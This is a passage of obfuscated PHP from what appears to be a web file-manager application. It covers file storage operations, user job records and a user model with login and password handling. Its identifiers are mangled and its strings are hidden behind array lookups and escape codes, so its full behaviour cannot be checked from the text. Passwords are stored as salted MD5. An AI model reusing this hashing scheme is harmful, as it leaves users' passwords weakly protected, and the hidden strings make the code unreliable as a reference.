$this->getPathOuter($ú†üÁÆ) : !1; } public function moveSameAllow() { } public function move($¨Å¹´Ú¬, $ îÌóà¿, $±Íà¬Î = REPEAT_REPLACE, $èËµ¸Ï = false) { $œ¶Ş€½ = $this->parse($ îÌóà¿); $ï‚Ñ´ëÔ = $this->model->move($¨Å¹´Ú¬, $œ¶Ş€½[$_SERVER[‚ûòÉ˜ş][451]], $±Íà¬Î, $èËµ¸Ï); return $ï‚Ñ´ëÔ ? $this->getPathOuter($ï‚Ñ´ëÔ) : !1; } public function remove($´ü¸Òçª, $“¥—ßä¤ = true) { return $this->model->remove($´ü¸Òçª, $“¥—ßä¤); } public function rename($³ğÄÚ¸¬, $è“ËÑÙ¨) { $ù•âèøø = $this->model->rename($³ğÄÚ¸¬, $è“ËÑÙ¨); return $ù•âèøø ? $this->getPathOuter($³ğÄÚ¸¬) : $ù•âèøø; } public function size($„¼ÃÂ†ø) { $¡ÜÁËÃá = $this->infoSimple($„¼ÃÂ†ø); return $¡ÜÁËÃá ? $¡ÜÁËÃá[$_SERVER[‚ûòÉ˜ş][86]] : 0; } public function infoSimple($óÍŠ™¹ş) { return $this->model->sourceInfo($óÍŠ™¹ş); } public function info($ ¦Íá¾ ) { return $this->infoParse($ ¦Íá¾ ); } public function infoAuth($±™Øôİ) { return $this->infoParse($±™Øôİ, !1, !0); } public function infoWithChildren($¬¯ÅÙ÷Ò) { return $this->infoParse($¬¯ÅÙ÷Ò, !0); } protected function infoParse($ñ€•÷¯Ğ, $È±ÒÑ¦ê = false, $ãÕÓÒ„İ = false) { if (!$È±ÒÑ¦ê) { return $this->model->pathInfo($ñ€•÷¯Ğ, $ãÕÓÒ„İ); } return $this->model->pathInfoMore($ñ€•÷¯Ğ); } public function infoFullSimple($‘ü©· è) { $£¥Æ³®© =& $_SERVER[‚ûòÉ˜ş]; $Ç†ÊÀ“š = explode($£¥Æ³®©[8], $‘ü©· è); $î‚—éàî = implode($£¥Æ³®©[8], array_splice($Ç†ÊÀ“š, 1)); return $this->model->pathInfoByPath($Ç†ÊÀ“š[0], $î‚—éàî); } public function infoFull($ÜÒİ¢óõ) { $‚±ãí± = $this->infoFullSimple($ÜÒİ¢óõ); return is_array($‚±ãí±) ? $this->model->pathInfo($‚±ãí±[$_SERVER[‚ûòÉ˜ş][191]]) : !1; } public function hashSimple($Î¢ğÄóè) { $¹åËÕ“œ =& $_SERVER[‚ûòÉ˜ş]; $ª÷‚·ƒÖ = $this->infoWithChildren($Î¢ğÄóè); return $ª÷‚·ƒÖ[$¹åËÕ“œ[524]][$¹åËÕ“œ[648]]; } public function hashMd5($ÜÔ¤ªÄ´) { $óóòğ•µ =& $_SERVER[‚ûòÉ˜ş]; $Œ¹ãüø³ = $this->infoWithChildren($ÜÔ¤ªÄ´); return $Œ¹ãüø³[$óóòğ•µ[524]][$óóòğ•µ[649]]; } public function exist($¥—”¬Õ—) { $Ìì¢«é =& $_SERVER[‚ûòÉ˜ş]; $òğ€‰‹à = $this->parse($¥—”¬Õ—); if (!$òğ€‰‹à[$Ìì¢«é[94]]) { return $this->isFile($¥—”¬Õ—) || $this->isFolder($¥—”¬Õ—); } $¯²¦¦ãó = array($Ìì¢«é[453] => $òğ€‰‹à[$Ìì¢«é[451]], $Ìì¢«é[42] => $òğ€‰‹à[$Ìì¢«é[94]]); $Û­èšî = $this->model->where($¯²¦¦ãó)->find(); return $Û­èšî ? !0 : !1; } public function isFile($İô‘‰éÔ) { $Ô°ìÖù® =& $_SERVER[‚ûòÉ˜ş]; $¿¨ÓŞß = $this->infoSimple($İô‘‰éÔ); return $¿¨ÓŞß && $¿¨ÓŞß[$Ô°ìÖù®[461]] == $Ô°ìÖù®[222] ? !0 : !1; } public function isFolder($çÂ¼ÑÀÂ) { $©Âš‡¶¹ =& $_SERVER[‚ûòÉ˜ş]; $ß×²É¬ = $this->infoSimple($çÂ¼ÑÀÂ); return $ß×²É¬ && $ß×²É¬[$©Âš‡¶¹[461]] == $©Âš‡¶¹[98] ? !0 : !1; } public function listPath($÷âı’½Ü, $”­óÒ« = false) { $”ê€ŒĞ =& $_SERVER[‚ûòÉ˜ş]; if ($÷âı’½Ü == $”ê€ŒĞ[12]) { return !1; } $Ä€›¥¼´ = array($”ê€ŒĞ[453] => $÷âı’½Ü); if ($”­óÒ«) { return $this->model->listSource($Ä€›¥¼´, -1); } return $this->model->listSource($Ä€›¥¼´); } public function has($ú­ö, $ğÜëÜÄ¨ = false, $ø¨‰ìî— = null) { $¿½İà– =& $_SERVER[‚ûòÉ˜ş]; $ûü­¬Í¶ = $this->infoWithChildren($ú­ö); if ($ğÜëÜÄ¨) { return array($¿½İà–[234] => $ûü­¬Í¶[$¿½İà–[234]], $¿½İà–[233] => $ûü­¬Í¶[$¿½İà–[233]]); } return $ø¨‰ìî— ? $ûü­¬Í¶[$¿½İà–[234]] : $ûü­¬Í¶[$¿½İà–[233]]; } public function listAll($º¥°Ãä¿) { $øş¿ş¸” = IO::info($this->pathParse[$_SERVER[‚ûòÉ˜ş][94]]); if (!$øş¿ş¸”) { return array(); } return $this->model->listAll($º¥°Ãä¿); } public function getContent($Û¤ÒÆ¯) { return $this->model->getContent($Û¤ÒÆ¯); } public function setContent($¹¸îà´, $ÏØğ«÷¹ = '') { return $this->model->setContent($¹¸îà´, $ÏØğ«÷¹); } public function fileSubstr($ÚÀÖ¢ Ö, $ã¬âŠÖ, $³‹Ë±ÈÜ) { return $this->model->fileSubstr($ÚÀÖ¢ Ö, $ã¬âŠÖ, $³‹Ë±ÈÜ); } public function download($Éì×‚Ó«, $ŒĞææ—õ = '') { $çŒäÄ„¹ = get_path_father($ŒĞææ—õ); $ƒŒö¥¾‘ = get_path_this($ŒĞææ—õ); $²°õèÚò = $this->model->fileInfoGet($Éì×‚Ó«); $Èş–¥ÔÓ = IO::copy($²°õèÚò[$_SERVER[‚ûòÉ˜ş][94]], $çŒäÄ„¹, !1, $ƒŒö¥¾‘); return $Èş–¥ÔÓ; } public function setModifyTime($Î¦óèå, $ºò†© = '') { $öœ¾ê¼à =& $_SERVER[‚ûòÉ˜ş]; if (!$Î¦óèå) { return; } $this->model->where(array($öœ¾ê¼à[467] => $Î¦óèå))->save(array($öœ¾ê¼à[95] => $ºò†©)); } public function upload($È› øˆÂ, $Ö‰ó·Úõ, $±éİÕ£Á = false, $óâœöµü = REPEAT_REPLACE) { $½ãèš¥ø =& $_SERVER[‚ûòÉ˜ş]; $ñŒá¾Ùå = $this->parse($È› øˆÂ); $´“©·Şü = $this->model->addFile($ñŒá¾Ùå[$½ãèš¥ø[451]], $Ö‰ó·Úõ, $ñŒá¾Ùå[$½ãèš¥ø[94]], $±éİÕ£Á, $óâœöµü); return $this->getPathOuter($´“©·Şü); } public function uploadFileByID($œ€¥Ë…¯, $¤¢ëåØ, $Ô°ÜÁ˜£) { $–ĞĞÚµ =& $_SERVER[‚ûòÉ˜ş]; $ÁÒĞ®ÖÊ = $this->parse($œ€¥Ë…¯); $ıÏ®éËİ = $this->model->addFileByFileID($ÁÒĞ®ÖÊ[$–ĞĞÚµ[451]], $¤¢ëåØ, $ÁÒĞ®ÖÊ[$–ĞĞÚµ[94]], $Ô°ÜÁ˜£); return $this->getPathOuter($ıÏ®éËİ); } public function addFileByRemote($œ±ò¹¥ú, $†àªËöÏ, $©àİÄËÙ = array(), $–ËŒ··š = '', $´„ƒÅª“) { $æÅÌŞ×à =& $_SERVER[‚ûòÉ˜ş]; $óüÃåÀí = $this->parse($œ±ò¹¥ú); $–ËŒ··š = empty($–ËŒ··š) ? $óüÃåÀí[$æÅÌŞ×à[94]] : $–ËŒ··š; $ Óåºé´ = $this->model->addFileByRemote($óüÃåÀí[$æÅÌŞ×à[451]], $†àªËöÏ, $–ËŒ··š, $©àİÄËÙ, $´„ƒÅª“); return $this->getPathOuter($ Óåºé´); } public function uploadLink($ÍÏøÌ»Ë, $å”»™¼÷ = 0) { $ççÇ¯¿ı =& $_SERVER[‚ûòÉ˜ş]; $”ì¦ó‘ = $this->parse($ÍÏøÌ»Ë); $½Õİûğí = _get($GLOBALS[$ççÇ¯¿ı[7]], $ççÇ¯¿ı[1375]); $Ÿ€àì°— = _get($GLOBALS[$ççÇ¯¿ı[7]], $ççÇ¯¿ı[1376]); $ÍÏøÌ»Ë = Model($ççÇ¯¿ı[651])->createFileName($”ì¦ó‘[$ççÇ¯¿ı[94]], $½Õİûğí, $Ÿ€àì°—); return IO::uploadLink($ÍÏøÌ»Ë, $å”»™¼÷); } public function fileNameAuto($ß’³¨ö›, $õå¶™Ó÷, $êÃáîÕû = REPEAT_REPLACE, $ Š„æê‡ = false) { return $this->model->fileNameAuto($ß’³¨ö›, $õå¶™Ó÷, $êÃáîÕû, $ Š„æê‡); } public function fileNameExist($¢©ÍÂë¨, $úïÄá©²) { return $this->model->fileNameExist($¢©ÍÂë¨, $úïÄá©²); } protected function _fileOut($úåÙ›Æ¿, $œş÷ÒÃ™ = false, $¨úĞĞƒş = false, $­×ÛŠ¥î = '', $ÑŒ•¡û¥ = false) { $ë²Ó¸‘– =& $_SERVER[‚ûòÉ˜ş]; $…Š–şµ = $this->model->sourceInfo($úåÙ›Æ¿); if ($…Š–şµ[$ë²Ó¸‘–[461]] == $ë²Ó¸‘–[98]) { header($ë²Ó¸‘–[1377]); die; } $¾İíûˆü = $this->model->fileInfoGet($úåÙ›Æ¿); $­×ÛŠ¥î = $¾İíûˆü[$ë²Ó¸‘–[649]] ? $¾İíûˆü[$ë²Ó¸‘–[649]] : $­×ÛŠ¥î; $ô—¶óÂ = is_array($GLOBALS[$ë²Ó¸‘–[179]]) ? $GLOBALS[$ë²Ó¸‘–[179]][$ë²Ó¸‘–[42]] : $…Š–şµ[$ë²Ó¸‘–[42]]; if ($ÑŒ•¡û¥) { return IO::fileOutServer($¾İíûˆü[$ë²Ó¸‘–[94]], $œş÷ÒÃ™, $ô—¶óÂ, $­×ÛŠ¥î); } IO::fileOut($¾İíûˆü[$ë²Ó¸‘–[94]], $œş÷ÒÃ™, $ô—¶óÂ, $­×ÛŠ¥î); } public function fileOut($õÆœ¦ü®, $º´şŸëÙ = false, $—­ğ·´— = false, $ÁÌÛğ±È = '') { $this->_fileOut($õÆœ¦ü®, $º´şŸëÙ, $—­ğ·´—, $ÁÌÛğ±È); } public function fileOutServer($ÙÆóùî, $İ¥ÌÛâÆ = false, $ûšÜöÚ‚ = false, $¤üµß¥‰ = '') { $this->_fileOut($ÙÆóùî, $İ¥ÌÛâÆ, $ûšÜöÚ‚, $¤üµß¥‰, !0); } protected function _fileOutImage($ãàãı÷‚, $§æ¤¶Û¢ = 250) { $ğéœ÷¨Á =& $_SERVER[‚ûòÉ˜ş]; $öÄ±Éåñ = $this->model->pathInfo($ãàãı÷‚); if ($öÄ±Éåñ[$ğéœ÷¨Á[461]] == $ğéœ÷¨Á[98]) { show_json($ğéœ÷¨Á[1378] . $ãàãı÷‚, !1); } $¥à£Ü«¢ = $this->model->fileInfoGet($ãàãı÷‚); $öÄ±Éåñ[$ğéœ÷¨Á[180]] = $¥à£Ü«¢[$ğéœ÷¨Á[94]]; $GLOBALS[$ğéœ÷¨Á[179]] = $öÄ±Éåñ; IO::fileOutImage($¥à£Ü«¢[$ğéœ÷¨Á[94]], $§æ¤¶Û¢); } public function fileOutImage($±Â£Õé, $»­¶¨ı = 250) { $this->_fileOutImage($±Â£Õé, $»­¶¨ı); } public function fileOutImageServer($ î˜àÅ…, $ô°ŸŸöå = 250) { $this->_fileOutImage($ î˜àÅ…, $ô°ŸŸöå); } public function link($‘¤šÆ¹, $ä„Ş¹ÃÑ = '') { $æ¦±‡Ù = $this->model->fileInfoGet($‘¤šÆ¹); return IO::link($æ¦±‡Ù[$_SERVER[‚ûòÉ˜ş][94]], $ä„Ş¹ÃÑ); } protected function parse($ç±É•Ò×) { $Ñë¡Ò… =& $_SERVER[‚ûòÉ˜ş]; if (strstr($ç±É•Ò×, $Ñë¡Ò…[8]) === !1) { return array($Ñë¡Ò…[469] => intval($ç±É•Ò×), $Ñë¡Ò…[94] => $Ñë¡Ò…[12], $Ñë¡Ò…[1374] => array()); } $»ë‘öœ… = explode($Ñë¡Ò…[8], trim($ç±É•Ò×, $Ñë¡Ò…[8])); if (count($»ë‘öœ…) < 2) { show_tips(clear_html($ç±É•Ò×) . $Ñë¡Ò…[1379]); } return array($Ñë¡Ò…[469] => intval($»ë‘öœ…[0]), $Ñë¡Ò…[94] => $»ë‘öœ…[1], $Ñë¡Ò…[1374] => array_slice($»ë‘öœ…, 1)); } } goto bˆùİÌó¨; BÊ½İ§øì’: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\152\157\142\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\144\145\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\x4a\157\x62\x4c\151\163\x74"; public function listData($ıÍ’–Ä³ = false, $íµÕæ¯— = "\x73\157\162\x74", $Ä©ƒœ´ó = false) { return parent::listData($ıÍ’–Ä³, $íµÕæ¯—, $Ä©ƒœ´ó); } public function remove($ìÌÊÁ) { return parent::remove($ìÌÊÁ); } public function add($ö°øÑÚë) { $˜†½Èˆ’ =& $_SERVER[‚ûòÉ˜ş]; if ($this->findByName($ö°øÑÚë[$˜†½Èˆ’[42]])) { return !1; } $ö°øÑÚë[$˜†½Èˆ’[1909]] = $this->getSort(); return parent::insert($ö°øÑÚë); } private function getSort() { $©Ä×à =& $_SERVER[‚ûòÉ˜ş]; $ú¤şÙ–Ÿ = parent::listData(); $Ê¸Õ¥»Û = array_to_keyvalue($ú¤şÙ–Ÿ, $©Ä×à[12], $©Ä×à[1909]); return empty($Ê¸Õ¥»Û) ? 0 : max($Ê¸Õ¥»Û) + 1; } public function update($‹·¦—‚¶, $´õô²²ˆ) { $ÓŞöç²û =& $_SERVER[‚ûòÉ˜ş]; $ş­£ª• = parent::listData($‹·¦—‚¶); $»Ù‹øŸÂ = $this->findByName($´õô²²ˆ[$ÓŞöç²û[42]]); if (!$ş­£ª• || $»Ù‹øŸÂ && $»Ù‹øŸÂ[$ÓŞöç²û[451]] != $ş­£ª•[$ÓŞöç²û[451]]) { return !1; } return parent::update($‹·¦—‚¶, $´õô²²ˆ); } public function setUserJob($ºÌÂÍ, $ŞĞ”¶½µ) { $ë»³µËÄ =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($ŞĞ”¶½µ)) { $ŞĞ”¶½µ = array($ŞĞ”¶½µ); } $Ïí’İå = parent::listData(); $Î†ŒÅõì = array_to_keyvalue($Ïí’İå, $ë»³µËÄ[42]); $³ŠŸ‚ä = $ë»³µËÄ[22]; foreach ($ŞĞ”¶½µ as $†äÊåæÇ) { if ($Î†ŒÅõì[$†äÊåæÇ]) { $³ŠŸ‚ä .= $Î†ŒÅõì[$†äÊåæÇ][$ë»³µËÄ[451]] . $ë»³µËÄ[60]; } else { $òı–Ç™ = $this->add($†äÊåæÇ); $³ŠŸ‚ä .= $òı–Ç™ . $ë»³µËÄ[60]; } } $³ŠŸ‚ä = rtrim($³ŠŸ‚ä, $ë»³µËÄ[60]); Model($ë»³µËÄ[575])->metaSet($ºÌÂÍ, self::JOB_KEY, $³ŠŸ‚ä); } public function getUserJob($„—ÂÒèÉ) { $ÄëÒ‘ = Model($_SERVER[‚ûòÉ˜ş][575])->metaGet($„—ÂÒèÉ); return $this->getUserJobInfo($ÄëÒ‘[self::JOB_KEY]); } public function getUserJobInfo($å¨Î÷ï™) { $äõø¤Ü =& $_SERVER[‚ûòÉ˜ş]; $Şê­û§… = explode($äõø¤Ü[60], $å¨Î÷ï™); $‘…éœ¹ = parent::listData(); $‘…éœ¹ = array_remove_key($‘…éœ¹, $äõø¤Ü[225]); $öÂ´ŠÒê = array(); foreach ($Şê­û§… as $È±öó¸) { if (isset($‘…éœ¹[$È±öó¸])) { $öÂ´ŠÒê[] = $‘…éœ¹[$È±öó¸]; } } return $öÂ´ŠÒê; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\155\145" => "\x75\x73\145\162\x5f\x6d\145\x74\x61", "\155\145\164\141\x46\151\145\154\144" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\151\143\x6b\x4e\141\155\x65\54\156\x61\x6d\145\x2c\141\x76\141\164\141\162\54\163\x65\170\54\x73\x74\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($«ŒÙÖœé) { $ÕÄ£ô¤â =& $_SERVER[‚ûòÉ˜ş]; $³ ğùÆ = $ÕÄ£ô¤â[2337]; return array($ÕÄ£ô¤â[1963] => array($«ŒÙÖœé[0], $³ ğùÆ), $ÕÄ£ô¤â[1965] => array($«ŒÙÖœé[0], $³ ğùÆ), $ÕÄ£ô¤â[2338] => array($«ŒÙÖœé[0], $³ ğùÆ)); } protected function getInfo($´éøÍ…º, $æ•±®“ø = false) { $œÄÑÛÇ = $this->getInfoSimple($´éøÍ…º); if (!is_array($œÄÑÛÇ)) { return array(); } if ($æ•±®“ø) { return $this->_getInfoApply($œÄÑÛÇ); } return $this->cacheFunctionGet($_SERVER[‚ûòÉ˜ş][1967], $´éøÍ…º); } protected function getInfoFull($´‚¢¯ú€, $èÂªÜ¶Â = false) { $§ë«æ£ø = $this->getInfoSimple($´‚¢¯ú€); if (!is_array($§ë«æ£ø)) { return array(); } if ($èÂªÜ¶Â) { return $this->_getInfoApply($§ë«æ£ø, !0); } return $this->cacheFunctionGet($_SERVER[‚ûòÉ˜ş][2339], $´‚¢¯ú€); } private function _getInfoApply($ûØñÏµª, $„Î€ªƒ± = false) { $†¸ –¾÷ =& $_SERVER[‚ûòÉ˜ş]; if (!$ûØñÏµª) { return $ûØñÏµª; } $Ñ˜¹÷­¡ = md5($†¸ –¾÷[2340] . $ûØñÏµª[$†¸ –¾÷[929]] . $†¸ –¾÷[2341] . $ûØñÏµª[$†¸ –¾÷[42]]); $ûØñÏµª = $this->_listDataApplyItem($ûØñÏµª); $î¬³¥£² = Model($†¸ –¾÷[1373])->metaGet($ûØñÏµª[$†¸ –¾÷[97]][$†¸ –¾÷[191]]); $ûØñÏµª[$†¸ –¾÷[2342]] = $Ñ˜¹÷­¡; $ûØñÏµª[$†¸ –¾÷[97]][$†¸ –¾÷[2159]] = isset($î¬³¥£²[$†¸ –¾÷[2160]]) ? $î¬³¥£²[$†¸ –¾÷[2160]] : null; if ($„Î€ªƒ±) { $ûØñÏµª[$†¸ –¾÷[515]] = $this->metaGet($ûØñÏµª[$†¸ –¾÷[1687]]); } return $ûØñÏµª; } protected function getInfoSimple($Ë« õ¼, $’—¨½ÏŒ = false) { $üÀÆ´èµ =& $_SERVER[‚ûòÉ˜ş]; if (!$Ë« õ¼) { return array(); } if ($’—¨½ÏŒ) { $Áí‘… = $this->where(array($üÀÆ´èµ[1687] => intval($Ë« õ¼)))->find(); if (!is_array($Áí‘…)) { return array(); } $Áí‘…[$üÀÆ´èµ[2343]] = Action($üÀÆ´èµ[2344])->parseUrl($Áí‘…[$üÀÆ´èµ[2343]]); return $Áí‘…; } return $this->cacheFunctionGet($üÀÆ´èµ[1968], $Ë« õ¼); } protected function getInfoSimpleOuter($ÄŠò‹œ) { $£é˜ê ÷ =& $_SERVER[‚ûòÉ˜ş]; if (!$ÄŠò‹œ || $ÄŠò‹œ == 0) { return array($£é˜ê ÷[1687] => $£é˜ê ÷[222], $£é˜ê ÷[42] => $£é˜ê ÷[173] . LNG($£é˜ê ÷[2345]) . $£é˜ê ÷[175], $£é˜ê ÷[2343] => STATIC_PATH . $£é˜ê ÷[2346]); } $ÜÅİ´§· = $this->cacheFunctionGet($£é˜ê ÷[1968], $ÄŠò‹œ); $Ç…®“ = array_field_key($ÜÅİ´§·, explode($£é˜ê ÷[60], $this->simpleField)); if (!$Ç…®“) { return array($£é˜ê ÷[1687] => $£é˜ê ÷[1229], $£é˜ê ÷[42] => $£é˜ê ÷[173] . LNG($£é˜ê ÷[2347]) . $£é˜ê ÷[175], $£é˜ê ÷[2343] => STATIC_PATH . $£é˜ê ÷[2348]); } $Ç…®“[$£é˜ê ÷[2343]] = Action($£é˜ê ÷[2344])->parseUrl($Ç…®“[$£é˜ê ÷[2343]]); return $Ç…®“; } protected function groupUser($Ì‚óã®ƒ) { } public static function errorLang($¼—ÈìĞ‰) { $ó©§Í£ğ =& $_SERVER[‚ûòÉ˜ş]; $¾ØÃ»Æ² = array(self::ERROR_USER_NOT_EXISTS => $ó©§Í£ğ[2349], self::ERROR_USER_PASSWORD_ERROR => $ó©§Í£ğ[2350], self::ERROR_USER_EXIST_NAME => $ó©§Í£ğ[2351], self::ERROR_USER_EXIST_PHONE => $ó©§Í£ğ[2352], self::ERROR_USER_EXIST_EMAIL => $ó©§Í£ğ[2353], self::ERROR_USER_LOGIN_LOCK => $ó©§Í£ğ[2354], self::ERROR_IP_NOT_ALLOW => $ó©§Í£ğ[2355], self::ERROR_USER_EXIST_NICKNAME => $ó©§Í£ğ[2356]); return LNG($¾ØÃ»Æ²[$¼—ÈìĞ‰]); } public function getInfoByMeta($ ªªÜ¨, $ôÙ”…Åı) { $¢Âï„å¨ =& $_SERVER[‚ûòÉ˜ş]; $æ¸Äàäİ = Model($¢Âï„å¨[2357])->where(array($¢Âï„å¨[104] => $ ªªÜ¨, $¢Âï„å¨[427] => $ôÙ”…Åı))->find(); if ($æ¸Äàäİ) { return $this->getInfo($æ¸Äàäİ[$¢Âï„å¨[1687]]); } return !1; } public function userLoginCheck($Á‘±ö¶, $æ÷—›ä¢) { $ºº¿ğí =& $_SERVER[‚ûòÉ˜ş]; $°‚Ç‡¥º = $this->userLoginFind($Á‘±ö¶); if (!$°‚Ç‡¥º) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($°‚Ç‡¥º[$ºº¿ğí[1687]], $æ÷—›ä¢)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($°‚Ç‡¥º[$ºº¿ğí[1687]]); } public function userLoginFind($–¡÷›Ò) { $ŞÑÆ‘Ñ =& $_SERVER[‚ûòÉ˜ş]; $³İ Ÿ‚ = array($ŞÑÆ‘Ñ[42] => $–¡÷›Ò, $ŞÑÆ‘Ñ[2167] => $–¡÷›Ò, $ŞÑÆ‘Ñ[358] => $–¡÷›Ò, $ŞÑÆ‘Ñ[2358] => $–¡÷›Ò, $ŞÑÆ‘Ñ[1041] => $ŞÑÆ‘Ñ[1043]); if ($this->nickNameRpt()) { unset($³İ Ÿ‚[$ŞÑÆ‘Ñ[2167]]); } return $this->where($³İ Ÿ‚)->find(); } public function clearCache($¨úÎÕÒ¤) { $ª—ôŠ¿¹ =& $_SERVER[‚ûòÉ˜ş]; $this->cacheFunctionClear($ª—ôŠ¿¹[1967], $¨úÎÕÒ¤); $this->cacheFunctionClear($ª—ôŠ¿¹[1968], $¨úÎÕÒ¤); $this->cacheFunctionClear($ª—ôŠ¿¹[2339], $¨úÎÕÒ¤); } public function userPasswordCheck($­†ËØ„¯, $–ê°’™) { $“•Ã­´Ú =& $_SERVER[‚ûòÉ˜ş]; $¯†¸˜‹Ü = $this->where(array($“•Ã­´Ú[1687] => intval($­†ËØ„¯)))->find(); $şÉ¤öÊ = $this->metaGet($­†ËØ„¯); $±æÎÉ‘ = isset($şÉ¤öÊ[$“•Ã­´Ú[2359]]) ? $şÉ¤öÊ[$“•Ã­´Ú[2359]] : $“•Ã­´Ú[12]; if (md5($±æÎÉ‘ . trim($–ê°’™)) !== $¯†¸˜‹Ü[$“•Ã­´Ú[929]]) { return !1; } return !0; } public function userAdd($™şØÌåÓ) { $Ô–òÚá© =& $_SERVER[‚ûòÉ˜ş]; $ö£Ç¦şå = array($Ô–òÚá©[470] => $™şØÌåÓ[$Ô–òÚá©[42]], $Ô–òÚá©[2360] => $™şØÌåÓ[$Ô–òÚá©[1562]], $Ô–òÚá©[2361] => isset($™şØÌåÓ[$Ô–òÚá©[358]]) ? $™şØÌåÓ[$Ô–òÚá©[358]] : $Ô–òÚá©[12], $Ô–òÚá©[2362] => isset($™şØÌåÓ[$Ô–òÚá©[2358]]) ? $™şØÌåÓ[$Ô–òÚá©[2358]] : $Ô–òÚá©[12], $Ô–òÚá©[2363] => isset($™şØÌåÓ[$Ô–òÚá©[2167]]) ? $™şØÌåÓ[$Ô–òÚá©[2167]] : $™şØÌåÓ[$Ô–òÚá©[42]], $Ô–òÚá©[2364] => isset($™şØÌåÓ[$Ô–òÚá©[2343]]) ? $™şØÌåÓ[$Ô–òÚá©[2343]] : $Ô–òÚá©[12], $Ô–òÚá©[2365] => isset($™şØÌåÓ[$Ô–òÚá©[2366]]) ? $™şØÌåÓ[$Ô–òÚá©[2366]] : 1, $Ô–òÚá©[2367] => $™şØÌåÓ[$Ô–òÚá©[929]], $Ô–òÚá©[1969] => isset($™şØÌåÓ[$Ô–òÚá©[1872]]) ? $™şØÌåÓ[$Ô–òÚá©[1872]] : 1024 * 1024 * 20, $Ô–òÚá©[1970] => 0, $Ô–òÚá©[2368] => 0, $Ô–òÚá©[2014] => isset($™şØÌåÓ[$Ô–òÚá©[790]]) ? $™şØÌåÓ[$Ô–òÚá©[790]] : 1); if (!empty($™şØÌåÓ[$Ô–òÚá©[1687]])) { $ö£Ç¦şå[$Ô–òÚá©[1687]] = $™şØÌåÓ[$Ô–òÚá©[1687]]; } $¡Ó›Ò¤“ = $this->_checkExist($™şØÌåÓ); if ($¡Ó›Ò¤“ !== !0) { return $¡Ó›Ò¤“; } if (!empty($ö£Ç¦şå[$Ô–òÚá©[2343]]) && strlen($ö£Ç¦şå[$Ô–òÚá©[2343]]) > 255) { $ö£Ç¦şå[$Ô–òÚá©[2343]] = $Ô–òÚá©[12]; } $©÷µÑ© = $this->add($ö£Ç¦şå); $«¼Ï†» = array($Ô–òÚá©[2367] => $ö£Ç¦şå[$Ô–òÚá©[929]], $Ô–òÚá©[2363] => $ö£Ç¦şå[$Ô–òÚá©[2167]]); $this->userEdit($©÷µÑ©, $«¼Ï†»); Model($Ô–òÚá©[1373])->userRootAdd($©÷µÑ©); return $©÷µÑ©; } protected function userEditTest($úê©íÓ¬, $›ºˆ÷ÏÌ) { return $this->call($_SERVER[‚ûòÉ˜ş][2369], $úê©íÓ¬, $›ºˆ÷ÏÌ); } protected function userEdit($ï‘ßóä, $¡×›Ö¤) { $Ù÷§¾µ‹ =& $_SERVER[‚ûòÉ˜ş]; $”—Éã = $this->getInfoSimple($ï‘ßóä); if (!$”—Éã) { return !1; } $ŸÊÛ—¾Ö = $this->_checkExist($¡×›Ö¤, $ï‘ßóä); if ($ŸÊÛ—¾Ö !== !0) { return $ŸÊÛ—¾Ö; } if (isset($¡×›Ö¤[$Ù÷§¾µ‹[929]]) && trim($¡×›Ö¤[$Ù÷§¾µ‹[929]]) != $Ù÷§¾µ‹[12]) { $…¹«»² = $this->metaGet($ï‘ßóä); if (empty($…¹«»²[$Ù÷§¾µ‹[2359]])) { $…¹«»²[$Ù÷§¾µ‹[2359]] = rand_string(10); Model($Ù÷§¾µ‹[554])->metaSet($ï‘ßóä, $Ù÷§¾µ‹[2359], $…¹«»²[$Ù÷§¾µ‹[2359]]); } $¡×›Ö¤[$Ù÷§¾µ‹[929]] = md5($…¹«»²[$Ù÷§¾µ‹[2359]] . trim($¡×›Ö¤[$Ù÷§¾µ‹[929]])); } else { unset($¡×›Ö¤[$Ù÷§¾µ‹[929]]); } if (!empty($¡×›Ö¤[$Ù÷§¾µ‹[2343]]) && strlen($¡×›Ö¤[$Ù÷§¾µ‹[2343]]) > 255) { $¡×›Ö¤[$Ù÷§¾µ‹[2343]] = $Ù÷§¾µ‹[12]; } $this->where(array($Ù÷§¾µ‹[1678] => $ï‘ßóä))->save($¡×›Ö¤); if (isset($¡×›Ö¤[$Ù÷§¾µ‹[2167]])) { $this->setNamePinyin($ï‘ßóä, $¡×›Ö¤[$Ù÷§¾µ‹[2167]]); } $this->clearCache($ï‘ßóä); return !0; } public function setNamePinyin($ì…»Û–É, $›†»ô€ã = false) { $±îÉÑßİ =& $_SERVER[‚ûòÉ˜ş]; if (!$›†»ô€ã) { $¼¼ü­„Ô = $this->getInfoSimple($ì…»Û–É); $›†»ô€ã = $¼¼ü­„Ô[$±îÉÑßİ[2167]] ? $¼¼ü­„Ô[$±îÉÑßİ[2167]] : $¼¼ü­„Ô[$±îÉÑßİ[42]]; } $ÁáÄœå‰ = Model($±îÉÑßİ[575]); if (!Input::check($›†»ô€ã, $±îÉÑßİ[631])) { return $ÁáÄœå‰->metaSet($ì…»Û–É, array($±îÉÑßİ[514] => $±îÉÑßİ[12], $±îÉÑßİ[513] => $±îÉÑßİ[12])); } return $ÁáÄœå‰->metaSet($ì…»Û–É, array($±îÉÑßİ[514] => str_replace($±îÉÑßİ[63], $±îÉÑßİ[12], Pinyin::get($›†»ô€ã)), $±îÉÑßİ[513] => Pinyin::get($›†»ô€ã, $±îÉÑßİ[632]))); } private function nickNameRpt() { $á³Å–Ç¤ =& $_SERVER[‚ûòÉ˜ş]; $ÛĞŠòÔ¦ = Model($á³Å–Ç¤[810])->get($á³Å–Ç¤[2370]); $Ï¦“òŒ‚ = 